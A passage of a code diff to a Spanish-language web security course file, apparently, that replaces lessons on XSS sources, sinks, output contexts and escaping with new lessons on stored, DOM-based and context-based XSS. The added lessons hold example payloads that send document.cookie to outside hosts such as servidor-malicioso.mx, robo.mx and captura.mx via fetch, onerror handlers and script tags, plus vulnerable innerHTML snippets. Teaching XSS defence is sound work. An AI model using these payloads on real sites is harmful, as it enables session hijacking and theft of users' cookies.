-          El DOM XSS ocurre enteramente en el navegador de la víctima, aprovechando APIs del Document Object Model (DOM). A diferencia de los XSS reflejados o almacenados, aquí el servidor no envía el payload malicioso incrustado en la respuesta; más bien, el propio código del sitio (JavaScript legítimo) toma datos no confiables, como la URL, el hash # en la ruta, el almacenamiento local, etc., y los inserta en la página dinámicamente de forma insegura.
+          y la página no codifica correctamente esos caracteres, el script se ejecutará en la interfaz del usuario sin ningún filtro.
         </p>
 
-        <p>
-          En otras palabras, la página original es segura cuando llega, pero luego un script del lado cliente modifica el DOM de manera vulnerable, posibilitando la inyección.
-        </p>
+        <h2>XSS almacenado</h2>
 
         <p>
-          Un ejemplo típico es una página que lee parte de la URL para mostrar contenido. Imagina un perfil de usuario en que la página cliente lee <code>location.hash</code> para mostrar secciones. Si alguien ingresa <code>http://sitio.com/perfil#&lt;script&gt;alert(1)&lt;/script&gt;</code>, y el código hace <code>innerHTML = location.hash</code>, terminará inyectando el script en el DOM y ejecutándolo en ese contexto. Todo esto sin interacción con el servidor tras la carga inicial.
-        </p>
-
-        <h3>Fuentes y sumideros peligrosos</h3>
-        <p>En el ataque DOM XSS, el origen de datos malicioso puede ser:</p>
-        <ul>
-          <li>La propia URL (<code>document.location</code> o sus fragmentos)</li>
-          <li>La consulta (<code>document.location.search</code>)</li>
-          <li>El fragment identifier (<code>document.location.hash</code>)</li>
-          <li>Las cookies (<code>document.cookie</code> si algún script las procesa)</li>
-          <li><code>window.name</code></li>
-          <li>Datos en <code>localStorage/sessionStorage</code></li>
-          <li>Mensajes recibidos por <code>postMessage</code>, etc.</li>
-        </ul>
-
-        <p>Y los sumideros (sinks) peligrosos son las operaciones DOM que interpretan contenido HTML/JS:</p>
-        <ul>
-          <li><code>innerHTML</code>, <code>outerHTML</code></li>
-          <li><code>document.write()</code>, <code>insertAdjacentHTML</code></li>
-          <li>Asignar a <code>location</code> o <code>srcdoc</code></li>
-          <li>Usar <code>eval()</code> o <code>new Function()</code> con datos externos, etc.</li>
-        </ul>
-
-        <p>
-          Si el código cliente usa estas funciones sin cuidado, un atacante puede suministrar datos que las provoquen a ejecutar código arbitrario.
-        </p>
-
-        <h3>Ejemplo vulnerable (DOM XSS)</h3>
-        <p>Supongamos el siguiente script en una página:</p>
-
-        <pre><code class="language-html highlight-vulnerable">&lt;p id="mensaje"&gt;&lt;/p&gt;
-&lt;script&gt;
-    // Lee el parámetro \`msg\` del fragmento # de la URL e insértalo en la página
-    const hash = window.location.hash;           // p.ej. "#msg=Hola"
-    const params = new URLSearchParams(hash.substring(1));  // elimina '#' y parsea
-    const mensaje = params.get('msg') || '¡Hola!';
-    document.getElementById('mensaje').innerHTML = mensaje;
-&lt;/script&gt;</code></pre>
-
-        <p>
-          Esto parece inocuo: si la URL es <code>pagina.html#msg=Bienvenido</code>, mostrará "Bienvenido". Pero un atacante puede enviarle a la víctima una URL como:
-        </p>
-
-        <pre><code>pagina.html#msg=&lt;img src=x onerror="alert('XSS')"&gt;</code></pre>
-
-        <p>
-          Cuando la víctima la abra, <code>mensaje</code> será <code>&lt;img src=x onerror="alert('XSS')"&gt;</code> y la línea <code>innerHTML</code> incrustará eso en el DOM, causando la ejecución del alert. El servidor nunca vio el script; está todo ocurriendo en el navegador. El código del desarrollador actuó como "intermediario" inseguro entre datos de la URL y el DOM.
-        </p>
-
-        <h3>Ejemplo seguro</h3>
-        <p>
-          La mejor práctica aquí es similar: nunca usar métodos como <code>innerHTML</code> con datos que no hayan sido limpiados. Si solo queremos insertar texto, usar <code>textContent</code> o <code>insertAdjacentText</code> en vez de <code>innerHTML</code>. Para el ejemplo:
-        </p>
-
-        <pre><code class="language-javascript highlight-secure">document.getElementById('mensaje').textContent = mensaje;</code></pre>
-
-        <p>
-          Con esto, aunque el hash contenga <code>&lt;img... onerror=...&gt;</code>, se insertará literalmente como texto visible, no ejecutable. Si realmente se necesita interpretar HTML (por ejemplo, insertar contenido enriquecido que viene de una API), se debe pasar ese HTML por un sanitizador robusto en el cliente (p.ej. DOMPurify) antes de usar <code>innerHTML</code>.
-        </p>
-
-        <h3>Frameworks modernos</h3>
-        <p>
-          Vale mencionar que los frameworks frontend modernos ayudan a minimizar el riesgo de DOM XSS: por ejemplo, React escapa automáticamente las variables incrustadas en JSX, Angular sanitiza contenido inseguro en bindings, Vue también escapa interpolaciones, etc. Sin embargo, todos ofrecen formas de insertar HTML bruto (por ejemplo, <code>dangerouslySetInnerHTML</code> en React, métodos del <code>DomSanitizer</code> en Angular) para casos especiales, y si el desarrollador los usa incorrectamente, puede introducir XSS a pesar de usar un framework.
-        </p>
-
-        <h3>Detección</h3>
-        <p>
-          Detectar DOM XSS requiere revisar el código JavaScript del lado cliente. Herramientas automatizadas como linters o escáneres pueden rastrear fuentes y sumideros peligrosos. Manualmente, se puede buscar en el código patrones como <code>innerHTML =</code>, <code>eval(</code>, <code>document.write(</code>, etc., y verificar si alguna variable influenciada por la URL u otra entrada externa llega allí sin sanear.
+          El XSS almacenado se produce cuando el atacante logra guardar el payload en la base de datos o en un almacén persistente utilizado por la aplicación. Cualquier usuario que acceda a la sección donde se muestra esa información será víctima del ataque. Esta variante es más grave que el XSS reflejado, ya que no depende de convencer a un usuario para seguir un enlace; basta con que visite la página comprometida.
         </p>
 
         <p>
-          A veces, la explotación de DOM XSS ni siquiera requiere recargar la página; basta con manipular el DOM una vez cargado (por ejemplo, a través de <code>location.hash</code> o <code>postMessage</code>). Como desarrollador, hay que tener en mente que el navegador es también un entorno de entrada no confiable y proteger en consecuencia.
+          Considere un sistema de anuncios donde los usuarios pueden publicar descripciones visibles públicamente:
         </p>
 
-        <h2>Resumen</h2>
-        <p>Hemos aprendido que XSS se presenta principalmente en tres formas:</p>
-
-        <ul>
-          <li><strong>Reflejado:</strong> el ataque viaja en cada petición y respuesta individual, típicamente vía parámetros en URLs o formularios. Es de corta vida (no persiste en el servidor) y a menudo requiere engañar al usuario para que cargue un enlace malicioso.</li>
-          
-          <li><strong>Almacenado:</strong> el ataque reside en la aplicación (base de datos u otro almacenamiento) y afecta a cualquier usuario que visite la parte comprometida del sitio. Suele ser el más peligroso por su alcance masivo y persistencia hasta que sea limpiado.</li>
-          
-          <li><strong>Basado en DOM:</strong> el ataque explota vulnerabilidades en scripts del lado cliente, sin implicar al servidor en la entrega del payload. Depende de cómo el código en el navegador maneja datos dinámicos; puede ocurrir incluso en aplicaciones que sanitizan bien en el servidor.</li>
-        </ul>
+        <pre><code>https://mercadodigital.mx/anuncio/4721</code></pre>
 
         <p>
-          Cada tipo requiere estrategias de detección y mitigación específicas, pero todos comparten el mismo principio subyacente: nunca confiar en datos no confiables al generar contenido web. En el próximo módulo profundizaremos en la importancia del contexto de salida, un factor crucial para aplicar correctamente las técnicas de escape y prevención según dónde se incrusta la información del usuario.
+          Si la aplicación no filtra adecuadamente la descripción enviada por el usuario, un atacante podría publicar un anuncio con un campo como:
         </p>
-
-        <p>
-          Entenderemos por qué no basta con un solo "escape genérico" y cómo adaptar la defensa al lugar exacto donde podría ocurrir la inyección XSS. Así podremos construir páginas que manejen de forma segura la información dinámica en cualquier contexto.
-        </p>
-      `
-    },
-    'contextos-salida-xss': {
-      id: 'contextos-salida-xss',
-      title: 'Contextos de salida y su importancia',
-      description: 'Descubre cómo el contexto donde se inserta la información determina el tipo de protección necesaria y aprende a reconocer los más comunes.',
-      category: 'xss',
-      htmlContent: `
-        <h2>Introducción</h2>
-        <p>
-          Uno de los conceptos más críticos en la prevención de XSS es el <strong>contexto de salida</strong> (output context). Cuando hablamos de "escapar" o "codificar" la salida para prevenir XSS, nos referimos a transformar los caracteres especiales en secuencias inocuas dependiendo del lugar donde esos datos serán insertados en el documento HTML.
-        </p>
-
-        <p>
-          Un error común es aplicar un escape inadecuado para el contexto, lo cual puede dejar vías de ataque abiertas. En este módulo explicaremos los distintos contextos en los que puede aparecer contenido dinámico en una página web y por qué cada uno requiere consideraciones especiales.
-        </p>
-
-        <p>En términos generales, al generar una página web hay múltiples contextos de salida que el navegador interpreta de forma distinta:</p>
-
-        <ul>
-          <li><strong>Contexto HTML</strong> (contenido de elementos HTML): texto que va entre las etiquetas de apertura y cierre de un elemento estándar (ej: <code>&lt;div&gt;...aquí...&lt;/div&gt;</code>).</li>
-          <li><strong>Contexto de Atributo HTML</strong>: valor dentro de comillas (o sin comillas) de un atributo de etiqueta (ej: <code>&lt;tag atributo="...aquí..."&gt;</code>).</li>
-          <li><strong>Contexto URL</strong> (en enlaces o src): valor colocado dentro de una URL, por ejemplo, en <code>href</code> de un enlace o <code>src</code> de un script/imagen.</li>
-          <li><strong>Contexto JavaScript</strong>: datos insertados dentro de un bloque <code>&lt;script&gt;</code> o evento en línea, o usados en una porción de código JS.</li>
-          <li><strong>Contexto CSS</strong>: datos dentro de estilos CSS, ya sea en un archivo CSS, en una etiqueta <code>&lt;style&gt;</code> interna, o en atributos de estilo en línea.</li>
-        </ul>
-
-        <p>
-          Cada contexto tiene un conjunto diferente de caracteres que son significativos para el navegador. Por tanto, la manera de neutralizar una posible inyección varía. Veamos por qué esto es importante con ejemplos de problemas que surgen si no distinguimos contextos, seguido de cómo manejar cada caso de forma segura.
-        </p>
-
-        <h2>Explicación de los diferentes contextos</h2>
-
-        <h3>1. Contexto HTML (contenido general)</h3>
-        <p>
-          Si insertamos texto en medio del HTML normal, debemos asegurarnos de escapar caracteres como <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code> y <code>'</code> para que no puedan formar etiquetas ni entidades. Por ejemplo, en un párrafo <code>&lt;p&gt;Nombre: [dato]&lt;/p&gt;</code>, si <code>[dato]</code> incluye <code>&lt;script&gt;</code>, sin escape iniciaría un script.
-        </p>
-
-        <p>
-          Escapando <code>&lt;</code> como <code>&amp;lt;</code> y <code>&gt;</code> como <code>&amp;gt;</code>, lo mostrará como texto visible. Este es el contexto más básico y la mayoría de los motores de plantillas (JSP, Twig, Handlebars, etc.) escapan correctamente en este contexto por defecto.
-        </p>
-
-        <h3>2. Contexto de Atributo HTML</h3>
-        <p>
-          Dentro de atributos, además de <code>&lt;</code> y <code>&gt;</code>, hay que escapar comillas (<code>"</code> y <code>'</code>) y otros caracteres como <code>&amp;</code> que podrían cerrar prematuramente el valor. Un patrón de ataque aquí es inyectar algo como <code>" onmouseover="alert(1)</code> dentro de un atributo.
-        </p>
-
-        <p>
-          Por ejemplo, si tenemos <code>&lt;img src="[url]"&gt;</code> y no ponemos comillas alrededor de <code>[url]</code>, un atacante podría enviar <code>javascript:alert(1)</code> o añadir espacios para salir del atributo e insertar uno nuevo.
-        </p>
-
-        <div class="warning-box">
-          <strong>¡Importante!</strong> Siempre rodear los valores de atributos con comillas, incluso si parecen seguros. Y escapar cualquier comilla presente en el valor.
-        </div>
-
-        <p>Por ejemplo:</p>
-
-        <pre><code class="language-html highlight-vulnerable">&lt;!-- Vulnerable --&gt;
-&lt;div class=&lt;?php echo $clase ?&gt;&gt;&lt;/div&gt;</code></pre>
-
-        <pre><code class="language-html highlight-secure">&lt;!-- Seguro --&gt;
-&lt;div class="&lt;?php echo htmlspecialchars($clase, ENT_QUOTES) ?&gt;"&gt;&lt;/div&gt;</code></pre>
-
-        <p>
-          En el primer caso, si <code>$clase</code> es algo como <code>onmouseover="alert(1)</code> se inyecta un atributo <code>onmouseover</code>. En el segundo, con comillas y escape, el payload no puede romper el atributo.
-        </p>
-
-        <p>
-          Además, ciertos atributos son inherentemente peligrosos si contienen datos no controlados: por ejemplo, cualquier atributo que inicie con <code>on</code> (eventos como <code>onerror</code>, <code>onclick</code>) ejecuta JavaScript, o atributos como <code>src</code> en un <code>&lt;script&gt;</code> o <code>href</code> en <code>&lt;iframe&gt;</code> pueden introducir scripts.
-        </p>
-
-        <h3>3. Contexto URL</h3>
-        <p>
-          Cuando la salida dinámica va dentro de una URL (ej. <code>&lt;a href="..."&gt;</code> o <code>&lt;form action="..."&gt;</code>), existe el riesgo de que un atacante provea una URL maliciosa. Un caso es inyectar un URL con el esquema <code>javascript:</code> en un enlace, convirtiéndolo en un disparador de código en lugar de un enlace real.
-        </p>
-
-        <pre><code class="language-html highlight-vulnerable">&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;</code></pre>
-
-        <p>
-          Para evitarlo, se debe validar y restringir URLs – por ejemplo, solo permitir ciertos esquemas (<code>http</code>, <code>https</code>) y dominios esperados. Además, se debe usar codificación URL para componentes variables de la URL (como parámetros de consulta), a fin de prevenir inyecciones que corten la URL o introduzcan parámetros inesperados.
-        </p>
-
-        <h3>4. Contexto JavaScript</h3>
-        <p>Este es crítico: si se inserta texto del usuario dentro de un bloque <code>&lt;script&gt;</code> o dentro de un código JS en línea, se corre un altísimo riesgo. Por ejemplo:</p>
 
         <pre><code class="language-html highlight-vulnerable">&lt;script&gt;
-    var mensaje = "[dato]";
-    alert(mensaje);
-&lt;/script&gt;</code></pre>
-
-        <p>Si <code>[dato]</code> contiene <code>"; alert('XSS');//</code>, entonces el código resultante será:</p>
-
-        <pre><code class="language-javascript">var mensaje = ""; alert('XSS');//";
-alert(mensaje);</code></pre>
-
-        <p>
-          El atacante cerró la cadena de texto y ejecutó su propio <code>alert('XSS')</code>. En JavaScript, además de escapar <code>&lt;/&gt;</code> (para no cerrar <code>&lt;script&gt;</code>), necesitamos escapar las comillas dentro de las cadenas y caracteres de escape como <code>\</code>.
-        </p>
-
-        <p>Una estrategia es no construir JavaScript con datos inseguros. Si se necesita usar un valor proporcionado por el usuario en código JS, lo más seguro es pasarlo como data y no como código. Por ejemplo, usar <code>JSON.stringify()</code> para insertar un objeto/valor:</p>
-
-        <pre><code class="language-html highlight-secure">&lt;script&gt;
-    var mensaje = JSON.parse('&lt;?php echo json_encode($dato) ?&gt;');
-    alert(mensaje);
+fetch('https://servidor-malicioso.mx/s', {
+  method: 'POST',
+  body: document.cookie
+});
 &lt;/script&gt;</code></pre>
 
         <p>
-          Por último, evitar totalmente funciones dinámicas como <code>eval()</code> o <code>new Function()</code> con contenido de usuario. Estas son peligrosas por diseño – incluso si escapas, es muy fácil cometer errores.
-        </p>
-
-        <h3>5. Contexto CSS</h3>
-        <p>
-          CSS también puede ser un vector, aunque menos común. En hojas de estilo en línea, un atacante podría romper la sintaxis CSS e inyectar algo malicioso. En versiones antiguas de IE, existía <code>expression()</code> en CSS para ejecutar JavaScript dentro de estilos (afortunadamente obsoleto).
+          Cada visitante que visualice ese anuncio ejecutará el script de manera inmediata. Este tipo de ataque ha sido responsable de incidentes relevantes en foros, sistemas educativos, redes sociales antiguas y herramientas de mensajería interna, donde los administradores suelen ser las primeras víctimas por revisar contenido generado por usuarios.
         </p>
 
         <p>
-          Aún así, se debe escapar caracteres como <code>&lt;/style&gt;</code> si se construye CSS mediante strings, para que no cierren la etiqueta de estilo. Además, en atributos <code>style</code> o etiquetas <code>&lt;style&gt;</code>, evitar inserción de <code>url(</code> con datos no validados, ya que <code>url(javascript:codigo)</code> sería ejecutable.
+          Otro escenario común se presenta en perfiles de usuario. Si un sistema muestra el nombre o la biografía directamente en la página sin codificar, un atacante puede introducir contenido como:
+        </p>
+
+        <pre><code class="language-html highlight-vulnerable">&lt;img src="i" onerror="document.location='https://robo.mx/x?c='+document.cookie"&gt;</code></pre>
+
+        <p>
+          Este payload ejecutará código sin requerir interacción adicional y afectará a cualquier usuario que consulte el perfil comprometido.
+        </p>
+
+        <h2>XSS basado en DOM</h2>
+
+        <p>
+          El XSS basado en DOM ocurre completamente en el lado del cliente. La aplicación no necesita comunicarse con el servidor para que el ataque funcione. El problema surge cuando JavaScript manipula el DOM utilizando datos no confiables provenientes de la URL, del fragmento hash o de entradas dinámicas.
         </p>
 
         <p>
-          Si necesitas insertar valores en CSS (como colores, tamaños), valida estrictamente que sean solo números o letras (ej. usando una expresión regular para hex de color, etc.).
+          A diferencia del XSS reflejado o almacenado, en el XSS basado en DOM el servidor no tiene control directo sobre la vulnerabilidad, ya que es el código JavaScript el que genera el problema. Esto es muy común en aplicaciones modernas que utilizan frameworks o bibliotecas que modifican la interfaz en tiempo real.
         </p>
 
-        <h2>Ejemplos de errores por contexto</h2>
-        <p>Para afianzar, veamos errores comunes al manejar contextos y cómo evitarlos:</p>
+        <p>Para ilustrarlo, considere la siguiente ruta:</p>
 
-        <h3>No escapar en contexto de atributo (y sin comillas)</h3>
+        <pre><code>https://panel-empresarial.mx/dashboard#mensaje=Bienvenido</code></pre>
+
+        <p>y un código como:</p>
+
+        <pre><code class="language-html highlight-vulnerable">var mensaje = window.location.hash.split('=')[1];
+document.getElementById('saludo').innerHTML = mensaje;</code></pre>
+
+        <p>Un atacante podría enviar un enlace como:</p>
+
+        <pre><code>https://panel-empresarial.mx/dashboard#mensaje=&lt;script&gt;document.location='https://captura.mx/c?d='+document.cookie&lt;/script&gt;</code></pre>
+
         <p>
-          Ya lo mencionamos, un clásico es construir algo como <code>&lt;input value=&lt;?php echo $nombre ?&gt;&gt;</code>. Si <code>$nombre</code> contiene una comilla, cierra el atributo. Solución: siempre usar comillas alrededor de los valores y escaparlos.
+          En este caso el servidor no interviene. El navegador evalúa el contenido del hash, y debido a que la aplicación utiliza innerHTML, el script se ejecuta. Este tipo de ataque ocurre con frecuencia en páginas que utilizan fragmentos de URL para cargar secciones dinámicas, paneles administrativos o componentes que se actualizan sin recargar la página.
         </p>
-
-        <h3>Escape HTML aplicado en contexto errado</h3>
-        <p>Imaginemos que sanitizamos una cadena para HTML y luego la usamos dentro de un <code>&lt;script&gt;</code>:</p>
-
-        <pre><code class="language-php highlight-vulnerable">$safe = htmlspecialchars($userData);
-echo "&lt;script&gt;var data = '$safe';&lt;/script&gt;";</code></pre>
 
         <p>
-          Podría parecer seguro porque escapamos <code>&lt;</code> y <code>&gt;</code>. Pero si <code>$userData</code> contiene <code>';alert(1);//</code>, la variable JS terminará como <code>var data = '';alert(1);//';</code> – el <code>htmlspecialchars</code> no escapó la comilla simple ni evitó la nueva línea, causando ejecución.
+          Otro ejemplo aparece en aplicaciones que leen valores desde la URL para construir contenido dinámico, como:
         </p>
 
-        <h3>Inyección en ruta de URL</h3>
+        <pre><code  class="language-html highlight-vulnerable">var usuario = new URLSearchParams(window.location.search).get('u');
+document.title = usuario;</code></pre>
+
         <p>
-          Un caso sutil es cuando concatenan strings para formar URLs en páginas redireccionables o links de descarga. Ej: <code>echo "&lt;a href='/perfil/{$userName}'&gt;Perfil&lt;/a&gt;"</code>. Si <code>$userName</code> contiene <code>evil/../admin</code> podría alterar la ruta.
+          Si el parámetro u contiene etiquetas HTML, el navegador podría interpretar contenido no controlado. Esto ocurre incluso en escenarios donde el backend está correctamente protegido.
         </p>
 
-        <h3>Uso de innerHTML con contenido de usuario</h3>
-        <p>
-          A veces el desarrollador confía porque "ya escapé en el servidor", pero luego en el cliente toma esa misma cadena y la asigna a <code>innerHTML</code>, provocando que el navegador la interprete nuevamente como HTML.
-        </p>
-
-        <h2>Buenas prácticas específicas de contexto</h2>
-        <p>Para manejar correctamente los contextos de salida, ten en cuenta estas prácticas:</p>
-
+        <h2>Bibliografía</h2>
         <ul>
-          <li><strong>HTML:</strong> Usa siempre escape de entidades (<code>&lt;→&amp;lt;</code>, etc.) para cualquier texto inyectado en HTML. Esto previene inyecciones de etiquetas o HTML no deseado.</li>
-          
-          <li><strong>Atributos HTML:</strong> Encierra todos los valores de atributos entre comillas dobles (<code>atributo="valor"</code>) o simples, y escapa el valor para ese contexto (escapar <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code> principalmente). Evita insertar datos en atributos de eventos (<code>onload</code>, <code>onclick</code>) o <code>href</code> de <code>javascript:</code>.</li>
-          
-          <li><strong>JavaScript:</strong> Evita construir código con datos. Si es inevitable, escapa caracteres especiales de JS (<code>"'</code>, <code>\</code>, <code>&lt;</code>, <code>&gt;</code> etc.) y considera envolver en <code>JSON.stringify</code>. Mejor aún, restructura tu código para que los datos del servidor se inyecten como data (por ejemplo, en un atributo <code>data-</code> o en un objeto JSON inicial) y no como código ejecutable.</li>
-          
-          <li><strong>CSS:</strong> No insertes lógica dentro de CSS con datos usuarios. Limítate a valores simples (colores, pixeles) y aun así, valida el formato (ej. usar una lista blanca de palabras o patrón regex). Escapa caracteres como <code>&gt;</code> si estás generando estilo interno.</li>
-          
-          <li><strong>URL:</strong> Construye URLs usando las herramientas del lenguaje (evitando concatenación manual). Escapa partes variables con codificación URL para que caracteres especiales (espacios, <code>&amp;</code>, <code>=</code>, <code>%</code>, etc.) no rompan la sintaxis.</li>
-          
-          <li><strong>Utiliza librerías probadas:</strong> Por ejemplo, DOMPurify para sanitizar HTML si realmente necesitas incrustar HTML rico aportado por usuario (como en un editor de texto enriquecido). O las funciones de encoding de OWASP para cada contexto (disponibles en muchos lenguajes).</li>
+          <li>OWASP Foundation, Cross-Site Scripting. [Online]. Available:
+            <a href="https://owasp.org/www-community/attacks/xss" target="_blank">
+              https://owasp.org/www-community/attacks/xss
+            </a>
+          </li>
+
+          <li>PortSwigger, DOM Based XSS. [Online]. Available:
+            <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">
+              https://portswigger.net/web-security/cross-site-scripting/dom-based
+            </a>
+          </li>
+
+          <li>Mozilla Developer Network, XSS Explained. [Online]. Available:
+            <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
+              https://developer.mozilla.org/en-US/docs/Web/Security
+            </a>
+          </li>
+
+          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>
+
+          <li>Google Web Security Guidelines. [Online]. Available:
+            <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
+              https://developers.google.com/web/fundamentals/security
+            </a>
+          </li>
         </ul>
-
-        <div class="warning-box">
-          <h4>Contextos "peligrosos" a evitar</h4>
-          <p>Si es posible, nunca insertes datos no confiables en:</p>
-          <ul>
-            <li>Secciones <code>&lt;script&gt;</code></li>
-            <li>Atributos de eventos (<code>onload</code>, <code>onclick</code>)</li>
-            <li>Secciones <code>&lt;style&gt;</code></li>
-            <li>URLs directas en <code>href</code> con <code>javascript:</code></li>
-          </ul>
-          <p>Simplemente es una mala práctica permitir eso, replantéa el diseño si te ves haciendo algo así.</p>
-        </div>
-
-        <h2>Resumen</h2>
-        <p>
-          En este módulo, profundizamos en por qué el contexto de salida determina la forma de protegernos contra XSS. Vimos que el navegador interpreta el contenido en diferentes contextos (HTML, atributo, URL, script, estilo), cada uno con su propia sintaxis y vectores de ataque.
-        </p>
-
-        <p>
-          Aprendimos con ejemplos que escapar correctamente en un contexto pero usar ese resultado en otro puede fallar (por ejemplo, escape HTML no basta en contexto JavaScript). Por ello, adoptamos el enfoque de "lo correcto en el lugar correcto", utilizando escapes específicos o evitando ciertas construcciones por completo.
-        </p>
-
-        <p>
-          La clave es nunca insertar datos sin escapar en el DOM sin antes preguntarse: <strong>¿Cómo va a leer esto el navegador?</strong>. Herramientas como las funciones de encoding de OWASP o sanitizadores nos ayudan a lidiar con esta complejidad, pero requieren que sepamos cuál aplicar.
-        </p>
-
-        <p>
-          Esta comprensión de contextos nos prepara para el siguiente paso: implementar prevención sistemática de XSS, donde combinaremos validación, escape contextual y otras medidas de seguridad como Content Security Policy para bloquear cualquier intento residual de ejecución no autorizada.
-        </p>
       `
     },
-    'dom-xss-ejecucion-cliente': {
-      id: 'dom-xss-ejecucion-cliente',
-      title: 'XSS basado en DOM',
-      description: 'Comprende cómo los scripts que manipulan el DOM pueden generar vulnerabilidades y aprende a manejar los datos del navegador de forma segura.',
+    'contextos-vectores-xss': {
+      id: 'contextos-vectores-xss',
+      title: 'Contextos y vectores de inyección',
+      description: '¿Dónde y cómo puede inyectarse código malicioso mediante XSS?',
       category: 'xss',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          En módulos previos distinguimos el XSS basado en DOM como una categoría particular en la que la vulnerabilidad no proviene directamente de la respuesta del servidor, sino de cómo el código JavaScript en el cliente maneja el contenido dinámico. Ahora profundizaremos en este tema.
+          La ejecución de un ataque XSS depende del contexto específico en el que el código malicioso es insertado dentro de la página. Cada sección del documento HTML representa un entorno distinto que determina qué tipo de contenido puede ejecutarse y qué restricciones existen para el navegador. Entender estos contextos es fundamental para identificar dónde puede producirse XSS y por qué ciertos payloads funcionan en algunos lugares y en otros no.
         </p>
 
         <p>
-          <strong>XSS basado en DOM (Document Object Model XSS)</strong> ocurre cuando el código del lado del cliente modifica la página de forma insegura utilizando datos que pueden ser influidos por un atacante, permitiendo la ejecución de código malicioso en el navegador. Aquí, el documento HTML original no necesariamente contiene el ataque; es el script en ejecución el que inserta o ejecuta algo indebido.
+          Los contextos más relevantes incluyen el contenido HTML, los atributos de elementos, el contenido de scripts, las URLs, el DOM y las funciones de manipulación dinámicas utilizadas por el frontend. En aplicaciones reales, estos contextos se combinan de manera compleja, especialmente en frameworks modernos, lo que facilita que un atacante encuentre espacios donde el contenido se procese de forma insegura.
         </p>
+
+        <h2>Inyección en HTML visible</h2>
 
         <p>
-          DOM XSS se ha vuelto más relevante con el auge de aplicaciones web de una sola página (SPA) y pesadas en JavaScript. Incluso sitios tradicionales agregan muchas funcionalidades con JS, abriendo potenciales vías de XSS que no aparecen en el HTML inicial. Es importante entender que proteger solo el lado servidor no basta si el cliente introduce sus propios riesgos.
+          La inyección más común ocurre directamente dentro del contenido HTML. Esto sucede cuando la aplicación coloca texto proporcionado por el usuario dentro de etiquetas como div, p, span o h1 sin codificar los caracteres que podrían formar parte de un script.
         </p>
 
-        <h2>¿Cómo funciona el DOM XSS?</h2>
-        <p>
-          El ataque se basa en identificar <strong>fuentes</strong> en el entorno del navegador que un atacante pueda controlar, y <strong>sumideros</strong> en el código cliente donde esos datos se introducen en el DOM o se evalúan como código sin la debida sanitización.
-        </p>
+        <p>Considere un portal de noticias ubicado en:</p>
 
-        <h3>Fuentes típicas controlables:</h3>
-        <ul>
-          <li><strong><code>window.location</code></strong> (y sus derivados <code>location.search</code>, <code>location.hash</code>, etc.): un atacante puede hacer que la víctima visite una URL manipulada con ciertos valores.</li>
-          
-          <li><strong><code>document.cookie</code>:</strong> Si bien el atacante externo no puede fijar cookies de otro dominio, podría aprovechar XSS reflejado previo para establecer cookies maliciosas que luego el propio sitio lea.</li>
-          
-          <li><strong>Almacenamiento Web:</strong> <code>localStorage/sessionStorage</code> si la aplicación guarda allí datos influenciados por usuario (por ejemplo, guardar un draft de comentario que pueda contener script).</li>
-          
-          <li><strong><code>document.referrer</code>:</strong> Si la víctima navega al sitio desde un enlace de terceros, el referrer puede contener cadenas que la página luego use.</li>
-          
-          <li><strong><code>window.name</code>:</strong> Este valor persiste mientras la pestaña esté abierta y puede ser establecido por un sitio malicioso antes de navegar a la página víctima.</li>
-          
-          <li><strong>Mensajes de otras ventanas:</strong> la API <code>postMessage</code> permite que una página reciba mensajes de otras; si el sitio procesa el <code>event.data</code> sin validar, es una vía.</li>
-          
-          <li><strong>Variables JavaScript globales:</strong> que puedan ser modificadas mediante interacciones previas (DOM clobbering, por ejemplo, donde elementos HTML con ciertos IDs sobreescriben variables globales).</li>
-        </ul>
+        <pre><code>https://noticiashoy.mx/articulo/598</code></pre>
 
-        <h3>Sumideros peligrosos:</h3>
-        <ul>
-          <li><strong><code>element.innerHTML / outerHTML / insertAdjacentHTML</code>:</strong> Insertan cadenas como HTML, interpretando etiquetas.</li>
-          
-          <li><strong><code>document.write() / document.writeln()</code>:</strong> Pueden escribir directamente en el documento (peligroso si se usan después de la carga inicial).</li>
-          
-          <li><strong><code>eval() / new Function() / setTimeout()</code> o <code>setInterval()</code> con string:</strong> Ejecutan texto como JavaScript.</li>
-          
-          <li><strong>Atributos de DOM:</strong> como <code>element.setAttribute('onclick', ...)</code> o asignar a <code>element.onclick = ...</code>: si el valor proviene del usuario, lo estás convirtiendo en código ejecutable.</li>
-          
-          <li><strong><code>location.href / location.assign</code>:</strong> redirigir con valores no confiables puede ser peligroso (open redirect), pero no ejecuta script en el mismo contexto.</li>
-        </ul>
+        <p>Si el sistema permite que los usuarios escriban comentarios y muestra el comentario dentro del HTML de la siguiente forma:</p>
 
-        <div class="warning-box">
-          <p><strong>Nota:</strong> <code>Element.innerText/textContent</code> en general no ejecutan HTML (son seguros para texto), así que no son sumideros peligrosos. Al contrario, son alternativas seguras.</p>
-        </div>
+        <pre><code class="language-html highlight-vulnerable">&lt;div class="comentario"&gt;[comentario_del_usuario]&lt;/div&gt;</code></pre>
+
+        <p>un atacante podría introducir contenido como:</p>
+
+        <pre><code>&lt;script&gt;fetch('https://captura.mx/c?cookie='+document.cookie)&lt;/script&gt;</code></pre>
+
+        <p>Cuando la página se renderiza, este script se ejecuta dentro del contexto principal del documento. Este escenario es extremadamente realista y ha ocurrido en foros antiguos, blogs corporativos y plataformas estudiantiles que no codificaban las entradas correctamente.</p>
+
+        <h2>Inyección en atributos HTML</h2>
 
         <p>
-          En resumen, DOM XSS sucede cuando combinas una fuente no confiable con un sumidero ejecutable sin limpieza de por medio.
+          Muchos ataques aprovechan atributos HTML que aceptan valores interpretados por el navegador. Estos atributos pueden ejecutar código directamente o activar eventos que permiten la ejecución de scripts.
         </p>
 
-        <h2>Ejemplo detallado de DOM XSS</h2>
-        <p>Retomemos y ampliemos el ejemplo ya visto: una página que muestra un mensaje de saludo tomando el valor de la URL hash:</p>
+        <p>Imagine un sitio de perfiles de artistas:</p>
 
-        <pre><code class="language-html highlight-vulnerable">&lt;p id="saludo"&gt;&lt;/p&gt;
-&lt;script&gt;
-  const hash = window.location.hash;  // e.g. "#nombre=Juan"
-  const params = new URLSearchParams(hash.slice(1));
-  const nombre = params.get('nombre') || 'visitante';
